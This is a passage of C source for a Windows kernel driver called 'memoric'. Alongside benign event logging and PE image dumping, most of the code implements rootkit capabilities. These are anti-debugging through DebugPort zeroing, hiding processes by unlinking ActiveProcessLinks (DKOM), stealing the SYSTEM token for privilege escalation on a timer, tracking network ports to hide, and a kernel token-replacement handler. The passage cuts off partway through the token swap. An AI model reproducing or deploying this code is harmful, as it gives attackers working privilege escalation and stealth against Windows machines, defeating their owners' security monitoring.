        RtlZeroMemory(g_RegProtectedKeys, sizeof(g_RegProtectedKeys));
        DbgPrint("[memoric] RegProtect: Cleared all entries\n");
        break;
    }
    default:
        status = STATUS_INVALID_PARAMETER;
        break;
    }

    return status;
}

/* ================================================================
 * Notification Routine — Process/Thread/Image Load logging
 *
 * Registers kernel notification callbacks and stores events
 * in a ring buffer for usermode retrieval.
 * ================================================================ */

#define NOTIFY_EVENT_RING_SIZE 256

static MEMORIC_NOTIFY_EVENT g_NotifyEvents[NOTIFY_EVENT_RING_SIZE] = { 0 };
static volatile LONG g_NotifyWriteIndex = 0;
static volatile LONG g_NotifyCount = 0;
static BOOLEAN g_NotifyProcessRegistered = FALSE;
static BOOLEAN g_NotifyThreadRegistered = FALSE;
static BOOLEAN g_NotifyImageRegistered = FALSE;

static VOID NotifyStoreEvent(PMEMORIC_NOTIFY_EVENT evt) {
    LONG idx = InterlockedIncrement(&g_NotifyWriteIndex) - 1;
    idx = idx % NOTIFY_EVENT_RING_SIZE;
    RtlCopyMemory(&g_NotifyEvents[idx], evt, sizeof(MEMORIC_NOTIFY_EVENT));
    InterlockedIncrement(&g_NotifyCount);
}

static VOID ProcessNotifyRoutine(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    MEMORIC_NOTIFY_EVENT evt = { 0 };
    UNREFERENCED_PARAMETER(Process);

    evt.EventType = MEMORIC_NOTIFY_PROCESS_CREATE;
    evt.ProcessId = (ULONG)(ULONG_PTR)ProcessId;
    evt.Create = CreateInfo ? 1 : 0;
    KeQuerySystemTimePrecise((PLARGE_INTEGER)&evt.Timestamp);

    if (CreateInfo) {
        evt.ParentProcessId = (ULONG)(ULONG_PTR)CreateInfo->ParentProcessId;
        if (CreateInfo->ImageFileName && CreateInfo->ImageFileName->Length > 0) {
            SIZE_T copyLen = min(CreateInfo->ImageFileName->Length, sizeof(evt.ImageName) - 2);
            RtlCopyMemory(evt.ImageName, CreateInfo->ImageFileName->Buffer, copyLen);
        }
    }

    NotifyStoreEvent(&evt);
}

static VOID ThreadNotifyRoutine(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create)
{
    MEMORIC_NOTIFY_EVENT evt = { 0 };

    evt.EventType = MEMORIC_NOTIFY_THREAD_CREATE;
    evt.ProcessId = (ULONG)(ULONG_PTR)ProcessId;
    evt.ThreadId = (ULONG)(ULONG_PTR)ThreadId;
    evt.Create = Create ? 1 : 0;
    KeQuerySystemTimePrecise((PLARGE_INTEGER)&evt.Timestamp);

    NotifyStoreEvent(&evt);
}

static VOID ImageNotifyRoutine(
    PUNICODE_STRING FullImageName,
    HANDLE ProcessId,
    PIMAGE_INFO ImageInfo)
{
    MEMORIC_NOTIFY_EVENT evt = { 0 };

    evt.EventType = MEMORIC_NOTIFY_IMAGE_LOAD;
    evt.ProcessId = (ULONG)(ULONG_PTR)ProcessId;
    evt.ImageBase = (ULONG64)ImageInfo->ImageBase;
    evt.ImageSize = ImageInfo->ImageSize;
    evt.Create = 1; /* image load is always "create" */
    KeQuerySystemTimePrecise((PLARGE_INTEGER)&evt.Timestamp);

    if (FullImageName && FullImageName->Length > 0) {
        SIZE_T copyLen = min(FullImageName->Length, sizeof(evt.ImageName) - 2);
        RtlCopyMemory(evt.ImageName, FullImageName->Buffer, copyLen);
    }

    NotifyStoreEvent(&evt);
}

static NTSTATUS HandleNotifyRoutine(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_NOTIFY_REQUEST req;
    NTSTATUS status = STATUS_SUCCESS;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_NOTIFY_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_NOTIFY_REQUEST)SystemBuffer;

    switch (req->Action) {
    case MEMORIC_NOTIFY_ACTION_REGISTER: {
        switch (req->NotifyType) {
        case MEMORIC_NOTIFY_PROCESS_CREATE:
            if (!g_NotifyProcessRegistered) {
                status = PsSetCreateProcessNotifyRoutineEx(ProcessNotifyRoutine, FALSE);
                if (NT_SUCCESS(status)) {
                    g_NotifyProcessRegistered = TRUE;
                    DbgPrint("[memoric] Notify: Process creation callback registered\n");
                }
            }
            break;
        case MEMORIC_NOTIFY_THREAD_CREATE:
            if (!g_NotifyThreadRegistered) {
                status = PsSetCreateThreadNotifyRoutine(ThreadNotifyRoutine);
                if (NT_SUCCESS(status)) {
                    g_NotifyThreadRegistered = TRUE;
                    DbgPrint("[memoric] Notify: Thread creation callback registered\n");
                }
            }
            break;
        case MEMORIC_NOTIFY_IMAGE_LOAD:
            if (!g_NotifyImageRegistered) {
                status = PsSetLoadImageNotifyRoutine(ImageNotifyRoutine);
                if (NT_SUCCESS(status)) {
                    g_NotifyImageRegistered = TRUE;
                    DbgPrint("[memoric] Notify: Image load callback registered\n");
                }
            }
            break;
        default:
            status = STATUS_INVALID_PARAMETER;
            break;
        }
        break;
    }
    case MEMORIC_NOTIFY_ACTION_UNREGISTER: {
        switch (req->NotifyType) {
        case MEMORIC_NOTIFY_PROCESS_CREATE:
            if (g_NotifyProcessRegistered) {
                PsSetCreateProcessNotifyRoutineEx(ProcessNotifyRoutine, TRUE);
                g_NotifyProcessRegistered = FALSE;
                DbgPrint("[memoric] Notify: Process creation callback unregistered\n");
            }
            break;
        case MEMORIC_NOTIFY_THREAD_CREATE:
            if (g_NotifyThreadRegistered) {
                PsRemoveCreateThreadNotifyRoutine(ThreadNotifyRoutine);
                g_NotifyThreadRegistered = FALSE;
                DbgPrint("[memoric] Notify: Thread creation callback unregistered\n");
            }
            break;
        case MEMORIC_NOTIFY_IMAGE_LOAD:
            if (g_NotifyImageRegistered) {
                PsRemoveLoadImageNotifyRoutine(ImageNotifyRoutine);
                g_NotifyImageRegistered = FALSE;
                DbgPrint("[memoric] Notify: Image load callback unregistered\n");
            }
            break;
        default:
            status = STATUS_INVALID_PARAMETER;
            break;
        }
        break;
    }
    case MEMORIC_NOTIFY_ACTION_QUERY: {
        /* Copy logged events to output buffer */
        ULONG maxEvents = req->MaxEvents;
        ULONG available = (ULONG)g_NotifyCount;
        ULONG toCopy;
        PMEMORIC_NOTIFY_EVENT outBuf = (PMEMORIC_NOTIFY_EVENT)SystemBuffer;

        if (maxEvents == 0 || maxEvents > NOTIFY_EVENT_RING_SIZE)
            maxEvents = NOTIFY_EVENT_RING_SIZE;
        if (available > NOTIFY_EVENT_RING_SIZE)
            available = NOTIFY_EVENT_RING_SIZE;

        toCopy = min(available, maxEvents);
        toCopy = min(toCopy, OutputLength / sizeof(MEMORIC_NOTIFY_EVENT));

        if (toCopy > 0) {
            LONG startIdx = ((g_NotifyWriteIndex - (LONG)toCopy) % NOTIFY_EVENT_RING_SIZE
                            + NOTIFY_EVENT_RING_SIZE) % NOTIFY_EVENT_RING_SIZE;
            ULONG j;
            for (j = 0; j < toCopy; j++) {
                LONG idx = (startIdx + (LONG)j) % NOTIFY_EVENT_RING_SIZE;
                RtlCopyMemory(&outBuf[j], &g_NotifyEvents[idx], sizeof(MEMORIC_NOTIFY_EVENT));
            }
        }

        *BytesReturned = toCopy * sizeof(MEMORIC_NOTIFY_EVENT);
        DbgPrint("[memoric] Notify: Returned %lu events (total logged: %lu)\n",
                 toCopy, available);
        break;
    }
    default:
        status = STATUS_INVALID_PARAMETER;
        break;
    }

    return status;
}

/* ================================================================
 * PE Dump — dump PE image from another process via MmCopyVirtualMemory
 *
 * Uses the kernel's MmCopyVirtualMemory to safely read the PE
 * from the target process even if pages are private/COW.
 * ================================================================ */

extern NTSYSCALLAPI NTSTATUS NTAPI MmCopyVirtualMemory(
    PEPROCESS SourceProcess,
    PVOID SourceAddress,
    PEPROCESS TargetProcess,
    PVOID TargetAddress,
    SIZE_T BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T ReturnSize
);

static NTSTATUS HandlePeDump(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_PE_DUMP_REQUEST req;
    PMEMORIC_PE_DUMP_RESPONSE resp;
    PEPROCESS process;
    NTSTATUS status;
    PVOID localBuf = NULL;
    SIZE_T bytesRead = 0;
    ULONG imageSize;
    ULONG64 baseAddr;
    UCHAR dosHeader[0x40] = { 0 };    /* DOS header */
    UCHAR ntHeaders[0x108] = { 0 };   /* NT headers (enough for PE32+) */
    ULONG peOffset;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_PE_DUMP_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_PE_DUMP_REQUEST)SystemBuffer;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    baseAddr = req->BaseAddress;

    /* If BaseAddress is 0, get the main module base via ZwQueryInformationProcess */
    if (baseAddr == 0) {
        /*
         * Use ProcessBasicInformation to get PebBaseAddress, then read
         * PEB.ImageBaseAddress. We use ZwQueryInformationProcess attached
         * to the target process to avoid hardcoded PEB offsets outside
         * of the documented PROCESS_BASIC_INFORMATION structure.
         */
        KAPC_STATE apcState;
        PVOID imgBase = NULL;

        /* Attach to target process and use ZwQueryInformationProcess */
        KeStackAttachProcess((PKPROCESS)process, &apcState);
        {
            PROCESS_BASIC_INFORMATION pbi;
            ULONG retLen = 0;
            status = ZwQueryInformationProcess(
                ZwCurrentProcess(), ProcessBasicInformation,
                &pbi, sizeof(pbi), &retLen);
            if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
                __try {
                    /* PEB.ImageBaseAddress is at offset 0x10 — documented in winternl.h */
                    imgBase = *(PVOID *)((PUCHAR)pbi.PebBaseAddress + 0x10);
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    status = STATUS_ACCESS_VIOLATION;
                }
            }
        }
        KeUnstackDetachProcess(&apcState);

        if (!NT_SUCCESS(status) || !imgBase) {
            ObDereferenceObject(process);
            return NT_SUCCESS(status) ? STATUS_UNSUCCESSFUL : status;
        }
        baseAddr = (ULONG64)(ULONG_PTR)imgBase;
    }

    /* Read DOS header to get PE signature offset */
    status = MmCopyVirtualMemory(
        process, (PVOID)(ULONG_PTR)baseAddr,
        PsGetCurrentProcess(), dosHeader,
        sizeof(dosHeader), KernelMode, &bytesRead);

    if (!NT_SUCCESS(status) || bytesRead < sizeof(dosHeader)) {
        ObDereferenceObject(process);
        return status;
    }

    /* Verify MZ signature */
    if (dosHeader[0] != 'M' || dosHeader[1] != 'Z') {
        ObDereferenceObject(process);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    /* Get e_lfanew (PE offset) */
    peOffset = *(ULONG*)&dosHeader[0x3C];
    if (peOffset > 0x1000) {
        ObDereferenceObject(process);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    /* Read NT headers */
    status = MmCopyVirtualMemory(
        process, (PVOID)((ULONG_PTR)baseAddr + peOffset),
        PsGetCurrentProcess(), ntHeaders,
        sizeof(ntHeaders), KernelMode, &bytesRead);

    if (!NT_SUCCESS(status) || bytesRead < 0x18) {
        ObDereferenceObject(process);
        return status;
    }

    /* Verify PE\0\0 signature */
    if (ntHeaders[0] != 'P' || ntHeaders[1] != 'E' ||
        ntHeaders[2] != 0 || ntHeaders[3] != 0) {
        ObDereferenceObject(process);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    /* Get SizeOfImage from Optional Header */
    /* For PE32+: OptionalHeader starts at offset 24, SizeOfImage at offset 56 */
    imageSize = *(ULONG*)&ntHeaders[24 + 56]; /* OptionalHeader.SizeOfImage */

    /* Clamp to max size */
    if (req->MaxSize > 0 && imageSize > req->MaxSize)
        imageSize = req->MaxSize;
    if (imageSize > MEMORIC_MAX_IO_SIZE - sizeof(MEMORIC_PE_DUMP_RESPONSE))
        imageSize = MEMORIC_MAX_IO_SIZE - sizeof(MEMORIC_PE_DUMP_RESPONSE);
    if (imageSize == 0 || imageSize > 64 * 1024 * 1024) {
        ObDereferenceObject(process);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    /* Check output buffer can hold response + PE data */
    if (OutputLength < sizeof(MEMORIC_PE_DUMP_RESPONSE) + imageSize) {
        /* Return just the header with size info so caller can retry */
        if (OutputLength >= sizeof(MEMORIC_PE_DUMP_RESPONSE)) {
            resp = (PMEMORIC_PE_DUMP_RESPONSE)SystemBuffer;
            resp->BaseAddress = baseAddr;
            resp->ImageSize = imageSize;
            resp->Reserved = 0;
            *BytesReturned = sizeof(MEMORIC_PE_DUMP_RESPONSE);
            ObDereferenceObject(process);
            return STATUS_BUFFER_OVERFLOW;
        }
        ObDereferenceObject(process);
        return STATUS_BUFFER_TOO_SMALL;
    }

    /* Allocate temp buffer for the PE */
    localBuf = ExAllocatePoolWithTag(NonPagedPool, imageSize, 'dmpM');
    if (!localBuf) {
        ObDereferenceObject(process);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlZeroMemory(localBuf, imageSize);

    /* Read the entire PE image */
    status = MmCopyVirtualMemory(
        process, (PVOID)(ULONG_PTR)baseAddr,
        PsGetCurrentProcess(), localBuf,
        imageSize, KernelMode, &bytesRead);

    if (!NT_SUCCESS(status)) {
        /* Partial read — try page by page */
        ULONG offset;
        bytesRead = 0;

        for (offset = 0; offset < imageSize; offset += PAGE_SIZE) {
            SIZE_T chunkSize = min(PAGE_SIZE, imageSize - offset);
            SIZE_T chunkRead = 0;

            NTSTATUS pageStatus = MmCopyVirtualMemory(
                process, (PVOID)((ULONG_PTR)baseAddr + offset),
                PsGetCurrentProcess(), (PVOID)((ULONG_PTR)localBuf + offset),
                chunkSize, KernelMode, &chunkRead);

            if (NT_SUCCESS(pageStatus))
                bytesRead += chunkRead;
            /* Skip unreadable pages (leave zeroed) */
        }

        /* If we got at least the headers, consider it success */
        if (bytesRead < 0x200) {
            ExFreePoolWithTag(localBuf, 'dmpM');
            ObDereferenceObject(process);
            return STATUS_PARTIAL_COPY;
        }
        status = STATUS_SUCCESS;
    }

    /* Build response: header + PE data */
    resp = (PMEMORIC_PE_DUMP_RESPONSE)SystemBuffer;
    resp->BaseAddress = baseAddr;
    resp->ImageSize = (ULONG)bytesRead;
    resp->Reserved = 0;

    RtlCopyMemory((PUCHAR)SystemBuffer + sizeof(MEMORIC_PE_DUMP_RESPONSE),
                  localBuf, bytesRead);

    *BytesReturned = sizeof(MEMORIC_PE_DUMP_RESPONSE) + (ULONG)bytesRead;

    ExFreePoolWithTag(localBuf, 'dmpM');
    ObDereferenceObject(process);

    DbgPrint("[memoric] PeDump: Dumped %llu bytes from PID %lu @ 0x%llX\n",
             (ULONG64)bytesRead, req->ProcessId, baseAddr);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Anti-Debug — DebugPort Manipulation
 *
 * Zeroes the DebugPort and related fields in EPROCESS to prevent
 * debugger attachment or hide existing debugger state.
 *
 * EPROCESS offsets (Windows 10/11 x64):
 *   DebugPort:       build-dependent (~0x578 / 0x580)
 *   Flags2:          build-dependent (~0x300 / 0x304)
 *     - NoDebugInherit bit
 * ================================================================ */

static NTSTATUS HandleSetDebugPort(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_DEBUG_PORT_REQUEST req;
    PEPROCESS process;
    NTSTATUS status;
    ULONG debugPortOffset;
    ULONG flags2Offset;

    UNREFERENCED_PARAMETER(OutputLength);
    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_DEBUG_PORT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_DEBUG_PORT_REQUEST)SystemBuffer;

    /* Use centralized EPROCESS offsets instead of per-function hardcoding */
    if (!g_Offsets.Resolved || g_Offsets.DebugPort == 0) {
        DbgPrint("[memoric] AntiDebug: EPROCESS offsets not resolved\n");
        return STATUS_NOT_SUPPORTED;
    }
    debugPortOffset = g_Offsets.DebugPort;
    flags2Offset = g_Offsets.Flags2;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    switch (req->Action) {
    case MEMORIC_DEBUG_CLEAR_PORT: {
        /* Zero the DebugPort pointer */
        PVOID *pDebugPort = (PVOID*)((ULONG_PTR)process + debugPortOffset);
        *pDebugPort = NULL;
        DbgPrint("[memoric] AntiDebug: Cleared DebugPort for PID %lu\n", req->ProcessId);
        break;
    }
    case MEMORIC_DEBUG_SET_NO_DEBUG: {
        /* Set NoDebugInherit flag in EPROCESS Flags2 */
        ULONG *pFlags2 = (ULONG*)((ULONG_PTR)process + flags2Offset);
        *pFlags2 |= 0x02; /* NoDebugInherit bit */
        DbgPrint("[memoric] AntiDebug: Set NoDebugInherit for PID %lu\n", req->ProcessId);
        break;
    }
    case MEMORIC_DEBUG_HIDE_FROM_DBG: {
        /* Clear DebugPort, set NoDebugInherit, and zero additional markers */
        PVOID *pDebugPort = (PVOID*)((ULONG_PTR)process + debugPortOffset);
        ULONG *pFlags2 = (ULONG*)((ULONG_PTR)process + flags2Offset);

        *pDebugPort = NULL;
        *pFlags2 |= 0x02; /* NoDebugInherit */

        DbgPrint("[memoric] AntiDebug: Full debug hide for PID %lu "
                 "(DebugPort zeroed, NoDebugInherit set)\n", req->ProcessId);
        break;
    }
    default:
        ObDereferenceObject(process);
        return STATUS_INVALID_PARAMETER;
    }

    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

/* ================================================================
 * DPC Timer — Schedule delayed kernel DPC execution
 * ================================================================ */

#define MAX_DPC_TIMERS 8

typedef struct _DPC_TIMER_SLOT {
    KTIMER      Timer;
    KDPC        Dpc;
    BOOLEAN     Active;
    ULONG       TargetPid;
    ULONG       Operation; /* 0=log, 1=hide_process, 2=escalate_token */
    ULONG       FireCount;
} DPC_TIMER_SLOT, *PDPC_TIMER_SLOT;

static DPC_TIMER_SLOT g_DpcTimers[MAX_DPC_TIMERS] = { 0 };
static BOOLEAN g_DpcTimersInitialized = FALSE;

static VOID MemoricDpcRoutine(
    struct _KDPC *Dpc,
    PVOID DeferredContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2)
{
    PDPC_TIMER_SLOT slot = (PDPC_TIMER_SLOT)DeferredContext;
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    if (!slot) return;

    slot->FireCount++;

    switch (slot->Operation) {
    case 0: /* Log only */
        DbgPrint("[memoric] DPC Timer fired: slot target PID=%lu, fire_count=%lu\n",
                 slot->TargetPid, slot->FireCount);
        break;

    case 1: { /* Hide process via DKOM */
        PEPROCESS process = NULL;
        NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)slot->TargetPid, &process);
        if (NT_SUCCESS(status)) {
            /* Minimal DKOM: unlink from ActiveProcessLinks */
            if (g_Offsets.Token > 0x100) { /* sanity check that offsets are resolved */
                ULONG linksOffset = g_Offsets.Token - 0x08; /* ActiveProcessLinks is typically before Token */
                PLIST_ENTRY links = (PLIST_ENTRY)((ULONG_PTR)process + linksOffset);
                if (links->Flink && links->Blink) {
                    links->Flink->Blink = links->Blink;
                    links->Blink->Flink = links->Flink;
                    links->Flink = links;
                    links->Blink = links;
                    DbgPrint("[memoric] DPC: DKOM hid PID %lu\n", slot->TargetPid);
                }
            }
            ObDereferenceObject(process);
        }
        break;
    }

    case 2: { /* Escalate token — copy System token */
        PEPROCESS targetProc = NULL, systemProc = NULL;
        NTSTATUS s1 = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)slot->TargetPid, &targetProc);
        NTSTATUS s2 = PsLookupProcessByProcessId((HANDLE)4, &systemProc);
        if (NT_SUCCESS(s1) && NT_SUCCESS(s2) && g_Offsets.Token) {
            ULONG_PTR sysToken = *(ULONG_PTR*)((ULONG_PTR)systemProc + g_Offsets.Token);
            *(ULONG_PTR*)((ULONG_PTR)targetProc + g_Offsets.Token) = sysToken;
            DbgPrint("[memoric] DPC: Escalated PID %lu to SYSTEM token\n", slot->TargetPid);
        }
        if (targetProc) ObDereferenceObject(targetProc);
        if (systemProc) ObDereferenceObject(systemProc);
        break;
    }
    }

    slot->Active = FALSE;
}

static NTSTATUS HandleDpcTimer(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_DPC_TIMER_REQUEST req;
    LARGE_INTEGER dueTime;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_DPC_TIMER_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_DPC_TIMER_REQUEST)SystemBuffer;

    if (req->TimerIndex >= MAX_DPC_TIMERS)
        return STATUS_INVALID_PARAMETER;

    /* Initialize timers on first use */
    if (!g_DpcTimersInitialized) {
        ULONG i;
        for (i = 0; i < MAX_DPC_TIMERS; i++) {
            KeInitializeTimer(&g_DpcTimers[i].Timer);
            KeInitializeDpc(&g_DpcTimers[i].Dpc, MemoricDpcRoutine, &g_DpcTimers[i]);
            g_DpcTimers[i].Active = FALSE;
            g_DpcTimers[i].FireCount = 0;
        }
        g_DpcTimersInitialized = TRUE;
    }

    switch (req->Action) {
    case MEMORIC_DPC_SCHEDULE: {
        PDPC_TIMER_SLOT slot = &g_DpcTimers[req->TimerIndex];
        if (slot->Active) {
            KeCancelTimer(&slot->Timer);
        }
        slot->TargetPid = req->TargetPid;
        slot->Operation = req->Operation;
        slot->Active = TRUE;
        slot->FireCount = 0;

        /* Negative = relative time in 100ns units */
        dueTime.QuadPart = -(LONGLONG)(req->DelayMs * 10000);
        KeSetTimer(&slot->Timer, dueTime, &slot->Dpc);

        DbgPrint("[memoric] DPC Timer %lu scheduled: delay=%lluMs, PID=%lu, op=%lu\n",
                 req->TimerIndex, req->DelayMs, req->TargetPid, req->Operation);
        break;
    }
    case MEMORIC_DPC_CANCEL: {
        PDPC_TIMER_SLOT slot = &g_DpcTimers[req->TimerIndex];
        if (slot->Active) {
            KeCancelTimer(&slot->Timer);
            slot->Active = FALSE;
            DbgPrint("[memoric] DPC Timer %lu cancelled\n", req->TimerIndex);
        }
        break;
    }
    case MEMORIC_DPC_QUERY: {
        PMEMORIC_DPC_TIMER_RESPONSE resp;
        if (OutputLength < sizeof(MEMORIC_DPC_TIMER_RESPONSE))
            return STATUS_BUFFER_TOO_SMALL;

        resp = (PMEMORIC_DPC_TIMER_RESPONSE)SystemBuffer;
        resp->TimerIndex = req->TimerIndex;
        resp->Active = g_DpcTimers[req->TimerIndex].Active ? 1 : 0;
        resp->RemainingMs = 0; /* Approximate - timers don't easily expose remaining */
        resp->FireCount = g_DpcTimers[req->TimerIndex].FireCount;
        resp->Reserved = 0;
        *BytesReturned = sizeof(MEMORIC_DPC_TIMER_RESPONSE);
        break;
    }
    default:
        return STATUS_INVALID_PARAMETER;
    }

    return STATUS_SUCCESS;
}

/* ================================================================
 * Port Hide — Track ports to hide (usermode NSI filter companion)
 * ================================================================ */

static USHORT  g_HiddenPorts[MEMORIC_MAX_HIDDEN_PORTS] = { 0 };
static USHORT  g_HiddenPortProtocol[MEMORIC_MAX_HIDDEN_PORTS] = { 0 };
static LONG    g_HiddenPortCount = 0;

static NTSTATUS HandlePortHide(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_PORT_HIDE_REQUEST req;
    LONG i;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_PORT_HIDE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_PORT_HIDE_REQUEST)SystemBuffer;

    switch (req->Action) {
    case MEMORIC_PORT_HIDE_ADD: {
        if (g_HiddenPortCount >= MEMORIC_MAX_HIDDEN_PORTS)
            return STATUS_INSUFFICIENT_RESOURCES;

        /* Check if already hidden */
        for (i = 0; i < g_HiddenPortCount; i++) {
            if (g_HiddenPorts[i] == req->Port && g_HiddenPortProtocol[i] == req->Protocol)
                return STATUS_SUCCESS; /* Already hidden */
        }

        i = InterlockedIncrement(&g_HiddenPortCount) - 1;
        if (i >= MEMORIC_MAX_HIDDEN_PORTS) {
            InterlockedDecrement(&g_HiddenPortCount);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        g_HiddenPorts[i] = req->Port;
        g_HiddenPortProtocol[i] = req->Protocol;

        DbgPrint("[memoric] Port hide: added %s port %hu\n",
                 req->Protocol == 0 ? "TCP" : "UDP", req->Port);
        break;
    }
    case MEMORIC_PORT_HIDE_REMOVE: {
        for (i = 0; i < g_HiddenPortCount; i++) {
            if (g_HiddenPorts[i] == req->Port && g_HiddenPortProtocol[i] == req->Protocol) {
                /* Shift remaining entries */
                LONG remaining = g_HiddenPortCount - i - 1;
                if (remaining > 0) {
                    RtlMoveMemory(&g_HiddenPorts[i], &g_HiddenPorts[i + 1],
                                  remaining * sizeof(USHORT));
                    RtlMoveMemory(&g_HiddenPortProtocol[i], &g_HiddenPortProtocol[i + 1],
                                  remaining * sizeof(USHORT));
                }
                InterlockedDecrement(&g_HiddenPortCount);
                DbgPrint("[memoric] Port hide: removed %s port %hu\n",
                         req->Protocol == 0 ? "TCP" : "UDP", req->Port);
                break;
            }
        }
        break;
    }
    case MEMORIC_PORT_HIDE_LIST: {
        PMEMORIC_PORT_HIDE_ENTRY entries;
        ULONG count = (ULONG)g_HiddenPortCount;
        ULONG needed = count * sizeof(MEMORIC_PORT_HIDE_ENTRY);

        if (OutputLength < needed && count > 0)
            return STATUS_BUFFER_TOO_SMALL;

        entries = (PMEMORIC_PORT_HIDE_ENTRY)SystemBuffer;
        for (i = 0; i < (LONG)count; i++) {
            entries[i].Port = g_HiddenPorts[i];
            entries[i].Protocol = g_HiddenPortProtocol[i];
        }
        *BytesReturned = needed;
        break;
    }
    case MEMORIC_PORT_HIDE_CLEAR:
        RtlZeroMemory(g_HiddenPorts, sizeof(g_HiddenPorts));
        RtlZeroMemory(g_HiddenPortProtocol, sizeof(g_HiddenPortProtocol));
        g_HiddenPortCount = 0;
        DbgPrint("[memoric] Port hide: cleared all hidden ports\n");
        break;
    default:
        return STATUS_INVALID_PARAMETER;
    }

    return STATUS_SUCCESS;
}

/* ================================================================
 * Token Duplicate — Kernel-level token theft and replacement
 * ================================================================ */

static NTSTATUS HandleTokenDup(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_TOKEN_DUP_REQUEST req;
    PMEMORIC_TOKEN_DUP_RESPONSE resp;
    PEPROCESS targetProcess = NULL;
    PEPROCESS sourceProcess = NULL;
    NTSTATUS status;
    ULONG sourcePid;
    ULONG targetPid;
    ULONG action;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_TOKEN_DUP_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_TOKEN_DUP_REQUEST)SystemBuffer;

    if (!g_Offsets.Token) {
        DbgPrint("[memoric] TokenDup: Token offset not resolved\n");
        return STATUS_NOT_SUPPORTED;
    }

    /* Save request fields before SystemBuffer gets overwritten by response */
    targetPid = req->TargetPid;
    action = req->Action;
    sourcePid = req->SourcePid;
    if (sourcePid == 0 || action == MEMORIC_TOKEN_SYSTEM)
        sourcePid = 4; /* System process */

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &targetProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[memoric] TokenDup: Cannot find target PID %lu\n", targetPid);
        return status;
    }

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)sourcePid, &sourceProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[memoric] TokenDup: Cannot find source PID %lu\n", sourcePid);
        ObDereferenceObject(targetProcess);
        return status;
    }

    switch (action) {
    case MEMORIC_TOKEN_COPY:
    case MEMORIC_TOKEN_SYSTEM: {
        ULONG_PTR *pTargetToken = (ULONG_PTR*)((ULONG_PTR)targetProcess + g_Offsets.Token);
        ULONG_PTR *pSourceToken = (ULONG_PTR*)((ULONG_PTR)sourceProcess + g_Offsets.Token);
        ULONG_PTR originalFastRef = *pTargetToken;
        ULONG_PTR sourceFastRef  = *pSourceToken;

        /* EX_FAST_REF: lower 4 bits are refcount, real pointer is value & ~0xF */
        PVOID originalTokenObj = (PVOID)(originalFastRef & ~(ULONG_PTR)0xF);
        PVOID sourceTokenObj   = (PVOID)(sourceFastRef & ~(ULONG_PTR)0xF);

        if (OutputLength < sizeof(MEMORIC_TOKEN_DUP_RESPONSE)) {
            ObDereferenceObject(sourceProcess);
            ObDereferenceObject(targetProcess);
            return STATUS_BUFFER_TOO_SMALL;
        }

        /*
         * Save original token for potential RESTORE before modifying.
         * If a save already exists for this PID, overwrite it.
         */
        {
            ULONG si, freeSlot = (ULONG)-1;
            for (si = 0; si < MAX_SAVED_TOKENS; si++) {
                if (g_SavedTokens[si].InUse && g_SavedTokens[si].TargetPid == targetPid) {
                    g_SavedTokens[si].OriginalFastRef = originalFastRef;
                    freeSlot = (ULONG)-2; /* already saved */
                    break;
                }
                if (!g_SavedTokens[si].InUse && freeSlot == (ULONG)-1)
                    freeSlot = si;
            }
            if (freeSlot < MAX_SAVED_TOKENS) {
                g_SavedTokens[freeSlot].InUse = TRUE;
                g_SavedTokens[freeSlot].TargetPid = targetPid;
                g_SavedTokens[freeSlot].OriginalFastRef = originalFastRef;
            }
        }

        /*
         * Properly reference-count the token swap:
         * 1. Reference the source token (it'll be used by target process)
         * 2. Write the new EX_FAST_REF (source pointer with max refcount)
         * 3. Dereference the original token (no longer used by target)
         */
        ObReferenceObject(sourceTokenObj);

